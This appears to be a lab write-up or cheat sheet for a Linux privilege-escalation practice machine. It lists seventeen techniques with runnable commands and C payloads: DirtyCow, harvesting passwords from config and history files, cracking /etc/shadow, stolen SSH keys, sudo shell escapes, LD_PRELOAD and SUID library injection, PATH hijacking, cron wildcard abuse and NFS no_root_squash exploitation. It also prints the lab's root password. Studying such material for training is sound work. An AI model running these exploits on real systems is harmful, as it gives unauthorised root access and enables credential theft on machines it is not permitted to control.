# IP Address
''''
10.10.75.233

''''

# Tools
''''
1. dirtycow
2. exim
3. linenum
4. linpeas
5. linux-exploit-suggester
6. nfsshell
7. nginx
8. source_files

''''

# 1. Privilage Escalation- Kernel Exploit
''''
## Detection
1. `linux-exploit-suggester.sh `	{ suggests the expolits with cve }	>> vulnerable to dirtycow

## Exploitation
1. `gcc -pthread c0w.c -o c0w`

2. `./c0w`

3. `passwd`		>> root shell

''''

# 2. Privilage Escalation - Stored Passwords (config files)
''''
1. In command prompt type: `cat /home/user/myvpn.ovpn`
2. From the output, make note of the value of the “auth-user-pass” directive.
3. In command prompt type: `cat /etc/openvpn/auth.txt`
4. From the output, make note of the clear-text credentials.
5. In command prompt type: `cat /home/user/.irssi/config | grep -i passw`
6. From the output, make note of the clear-text credentials.

''''

# 3. Privilage Escalaction - Stored Passwords ( history )
''''
```
command : cat ~/.bash_history | grep -i passw
```

''''

# 4. Privilage Escalation - Weak File Permissions
''''
## Detection
1. `ls -la /etc/shadow `		>> note the file permissions
`-rw-rw-r-- 1 root shadow 809 Jun 17  2020 /etc/shadow`

## Exploitation
1. In command prompt type: `cat /etc/passwd`
2. Save the output to a file on your attacker machine
3. In command prompt type: `cat /etc/shadow`
4. Save the output to a file on your attacker machine

<in attacker box >
	
1. In command prompt type: `unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`

Now:
	
`hashcat -m 1800 unshadowed.txt rockyou.txt -O`

''''

# 5. Privilage Escalation - SSH Keys
''''
## Detection
1. In command prompt type:
`find / -name authorized_keys 2> /dev/null`
2. In a command prompt type:
`find / -name id_rsa 2> /dev/null`
3. Note the results. 

## Exploitation
<target box>

1. Copy the contents of the discovered id_rsa file to a file on your attacker VM.

<attacker box>

1. In command prompt type: `chmod 400 id_rsa`
2. In command prompt type: `ssh -i id_rsa root@<ip>`

''''

# 6. Privilage Escalation - Sudo ( Shell Escaping )
''''
## Detection
1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo. 

## Exploitation
1. In command prompt type any of the following:
a. `sudo find /bin -name nano -exec /bin/sh \;`
b. `sudo awk 'BEGIN {system("/bin/sh")}'`
c. `echo "os.execute('/bin/sh')" > shell.nse && sudo nmap --script=shell.nse`
d. `sudo vim -c '!sh' `

''''

# 7. Privilage Escalation - Sudo (Abusing Intended Functionality)
''''
## Detection

<target box>

1. In command prompt type: `sudo -l`
2. From the output, notice the list of programs that can run via sudo.

## Exploitation

<target box>

1. In command prompt type:
`sudo apache2 -f /etc/shadow`
2. From the output, copy the root hash.

<attacker box>

1. Open command prompt and type:
`echo '[Pasted Root Hash]' > hash.txt`
2. In command prompt type:
`john --wordlist=/usr/share/wordlists/nmap.lst hash.txt`
3. From the output, notice the cracked credentials.


''''

# 8. Privilage Escalation - Sudo (LD_PRELOAD) 
''''
## Detection

<target box>

1. In command prompt type: `sudo -l`
2. From the output, notice that the LD_PRELOAD environment variable is intact.

Exploitation

1. Open a text editor and type:
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
2. Save the file as x.c
3. In command prompt type:
`gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
4. In command prompt type:
`sudo LD_PRELOAD=/tmp/x.so apache2`
5. In command prompt type: `id`


''''

# 9. Privilage Escalation -  SUID (Shared Object Injection)
''''
## Detection

<target box>

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command line type:
`strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
4. From the output, notice that a .so file is missing from a writable directory.

## Exploitation

<target box>

5. In command prompt type: `mkdir /home/user/.config`
6. In command prompt type: `cd /home/user/.config`
7. Open a text editor and type:
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
8. Save the file as libcalc.c
9. In command prompt type:
`gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
10. In command prompt type: `/usr/local/bin/suid-so`
11. In command prompt type: `id`

''''

# 10. Privilage Escalation -  SUID (Symlinks)
''''
## Detection

<target box>

1. In command prompt type: `dpkg -l | grep nginx`
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.

## Exploitation

<target box> – Terminal 1

1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root
2. The root password is password123
3. Once escalated to root, in command prompt type: su -l www-data
4. In command prompt type: `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.

<target box> – Terminal 2

1. Once logged in, type: su root
2. The root password is password123
3. As root, type the following: invoke-rc.d nginx rotate >/dev/null 2>&1
4. Switch back to the previous terminal.

<target box> – Terminal 1

1. From the output, notice that the exploit continued its execution.
2. In command prompt type: id

''''

# 11. Privilage Escalation -  SUID (Environment Variables #1) 
''''
## Detection

<target box>

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env`
4. From the output, notice the functions used by the binary.

## Exploitation

<target box>

1. In command prompt type:
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
2. In command prompt type: `gcc /tmp/service.c -o /tmp/service`
3. In command prompt type: `export PATH=/tmp:$PATH`
4. In command prompt type: `/usr/local/bin/suid-env`
5. In command prompt type: `id`

''''

# 12. Privilage Escalation - SUID (Environment Variables #2)
''''
## Detection

<target box>

1. In command prompt type: `find / -type f -perm -04000 -ls 2>/dev/null`
2. From the output, make note of all the SUID binaries.
3. In command prompt type: `strings /usr/local/bin/suid-env2`
4. From the output, notice the functions used by the binary.

## Exploitation Method #1

<target box>

1. In command prompt type:
`function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
2. In command prompt type:
`export -f /usr/sbin/service`
3. In command prompt type: `/usr/local/bin/suid-env2`

## Exploitation Method #2

<target box>

1. In command prompt type:
`env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`

''''

# 13. Privilage Escalation - Capabilities
''''
## Detection

<target box>

1. In command prompt type: `getcap -r / 2>/dev/null`
2. From the output, notice the value of the “cap_setuid” capability.

Exploitation

<target box>

1. In command prompt type:
`/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
2. Enjoy root!

''''

# 14. Privilage Escalation - Cron (Path) 
''''
## Detection

<target box>

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the value of the “PATH” variable.

## Exploitation

<target box>

1. In command prompt type:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh`
2. In command prompt type: `chmod +x /home/user/overwrite.sh`
3. Wait 1 minute for the Bash script to execute.
4. In command prompt type: `/tmp/bash -p`
5. In command prompt type: `id`

''''

# 15. Privilage Escalation - Corn (Wildcards) 
''''
## Detection

<target box>

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “/usr/local/bin/compress.sh”
3. In command prompt type: `cat /usr/local/bin/compress.sh`
*4. From the output, notice the wildcard (*) used by ‘tar’. 

## Exploitation

<target box>

1. In command prompt type:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
2. `touch /home/user/--checkpoint=1`
3. `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
4. Wait 1 minute for the Bash script to execute.
5. In command prompt type: `/tmp/bash -p`
6. In command prompt type: `id`

''''

# 16. Privilage Escalation - Corn (File Overwrite)
''''
## Detection

<target box>

1. In command prompt type: `cat /etc/crontab`
2. From the output, notice the script “overwrite.sh”
3. In command prompt type: `ls -l /usr/local/bin/overwrite.sh`
4. From the output, notice the file permissions.

## Exploitation

<target box>

1. In command prompt type:
`echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
2. Wait 1 minute for the Bash script to execute.
3. In command prompt type: `/tmp/bash -p`
4. In command prompt type: `id`

''''

# 17. Privilage Escalation - NFS Root Squashing
''''
## Detection

<target box>

1. In command line type: `cat /etc/exports`
2. From the output, notice that “no_root_squash” option is defined for the “/tmp” export.

## Exploitation

<attacker box>

1. Open command prompt and type: `showmount -e 10.10.75.233`
2. In command prompt type: `mkdir /tmp/1`
3. In command prompt type: `mount -o rw,vers=2 10.10.75.233:/tmp /tmp/1`
In command prompt type:
`echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
4. In command prompt type: `gcc /tmp/1/x.c -o /tmp/1/x`
5. In command prompt type: `chmod +s /tmp/1/x`

<target box>

1. In command prompt type: `/tmp/x`
2. In command prompt type: `id`

''''